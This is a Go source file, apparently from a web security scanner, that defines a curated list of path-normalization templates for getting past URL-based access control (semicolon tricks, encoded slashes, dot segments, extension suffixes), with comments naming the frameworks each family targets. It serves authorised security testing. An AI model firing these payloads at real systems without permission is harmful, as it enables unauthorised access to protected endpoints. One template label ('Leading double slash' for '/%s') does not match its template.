package pathnorm

// defaultPayloads returns the full set of path-normalization bypass
// templates we test. Each template's %s placeholder receives the path
// segment (e.g., "admin"). The set is curated from public bug-bounty
// disclosures and PortSwigger Web Security Academy labs covering the
// "URL-based access control bypass" topic — every entry has at least
// one published exploit against a major framework or CDN.
//
// Coverage by family:
//
//   - Semicolon path-parameter (RFC 3986 §3.3) — Spring, Tomcat, Jetty
//     strip everything after the first ";" before routing, but auth
//     filters and reverse proxies usually compare the raw URL.
//   - Dot-segment traversal — both raw and percent-encoded variants;
//     normalization-order bugs in Apache, IIS, Nginx historic CVEs.
//   - Encoded slash — / vs %2F vs %252F (double-encoded). Caught by
//     CVE-2017-9797 (IIS) and several Spring auth filter chains.
//   - Trailing dot/slash/segment append — Express, ASP.NET MVC default
//     trailing-slash collapse; the auth filter runs against the un-
//     collapsed path.
//   - Suffix extension append — .json, .html, .xml; the framework
//     dispatches to the same controller but the auth chain may have
//     a separate (looser) filter for "static" extensions.
func defaultPayloads() []bypassPayload {
	return []bypassPayload{
		// --- Semicolon path-parameter family (Spring/Tomcat/Jetty) ---
		{Template: "..;/%s", Description: "Semicolon path traversal (Spring/Tomcat)"},
		{Template: "/%s..;/", Description: "Semicolon suffix bypass (Spring)"},
		{Template: "%s;", Description: "Bare semicolon append (Tomcat path-param strip)"},
		{Template: "%s;.html", Description: "Semicolon + .html (path-param + extension confusion)"},
		{Template: "%s;swagger-ui/", Description: "Semicolon + known-public segment (Spring Boot leak)"},

		// --- Dot-segment traversal family ---
		{Template: "....///%s", Description: "Quadruple dot triple slash"},
		{Template: "%s/.", Description: "Trailing dot segment"},
		{Template: "%s/./", Description: "Dot-segment append with slash"},
		{Template: "%s/..", Description: "Trailing parent traversal"},
		{Template: "%s/../%s", Description: "Self-referential parent traversal"},

		// --- Encoded slash family ---
		{Template: "%s%%2F", Description: "Trailing %2F"},
		{Template: "%s%%2f", Description: "Trailing %2f (lowercase)"},
		{Template: "%s%%252F", Description: "Double-encoded slash"},
		{Template: "%%2e%%2e%%2f%s", Description: "Encoded ../"},
		{Template: "..%%252f%s", Description: "Double-encoded ../"},

		// --- Trailing slash / segment append ---
		{Template: "%s/", Description: "Trailing slash"},
		{Template: "%s//", Description: "Double trailing slash"},
		{Template: "/%s/", Description: "Wrapped trailing slash"},
		{Template: "%s/%%20", Description: "Trailing encoded space"},

		// --- Suffix extension family ---
		// Static-asset routes often have a permissive auth chain; if the
		// app dispatches /admin.json to the same controller as /admin but
		// the auth filter only protects "non-static" paths, this hits.
		{Template: "%s.json", Description: "JSON extension suffix"},
		{Template: "%s.html", Description: "HTML extension suffix"},
		{Template: "%s.xml", Description: "XML extension suffix"},
		{Template: "%s.css", Description: "CSS extension suffix (often whitelisted by auth)"},

		// --- Misc ---
		{Template: "/%s", Description: "Leading double slash"},
		{Template: "/./%s", Description: "Leading dot segment"},
		{Template: "//%s", Description: "Schemeless absolute (some proxies treat as relative)"},
	}
}
